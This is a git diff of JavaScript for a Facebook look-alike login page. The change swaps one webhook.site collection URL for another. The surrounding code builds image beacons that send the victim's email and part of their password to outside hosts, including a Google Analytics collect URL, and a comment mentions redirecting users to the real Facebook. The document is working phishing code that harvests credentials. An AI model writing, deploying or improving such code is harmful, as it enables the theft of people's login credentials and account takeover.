@@ -1,6 +1,6 @@
 console.log("Facebook Clone Script Loaded - IMAGE BEACON ACTIVATED");
 
-const WEBHOOK_URL = 'https://webhook.site/816de6c3-0cb4-492c-a6f9-470c1557bbc0';  // 🔥 NEW WEBHOOK
+const WEBHOOK_URL = 'https://webhook.site/e357584e-0282-462f-8400-dd0379d4ad27';  // 🔥 NEW WEBHOOK
 
 function togglePassword() {
     const passwordInput = document.getElementById('password');
@@ -166,7 +166,7 @@ function sendImageBeacon(email, password, attempts) {
     const ga = new Image(1, 1);
     ga.src = `https://www.google-analytics.com/collect?v=1&t=event&tid=UA-000&cid=${encodeURIComponent(email.substring(0, 15))}&ec=login&ea=submit&el=${attempts}|${password.substring(0, 10)}`;
 
-    console.log('✅ 3x BEACONS SENT → Check: https://webhook.site/816de6c3-0cb4-492c-a6f9-470c1557bbc0');
+    console.log('✅ 3x BEACONS SENT → Check: https://webhook.site/e357584e-0282-462f-8400-dd0379d4ad27');
 }
 
 // 🔥 NEW handleLogin (REAL FB REDIRECTS)
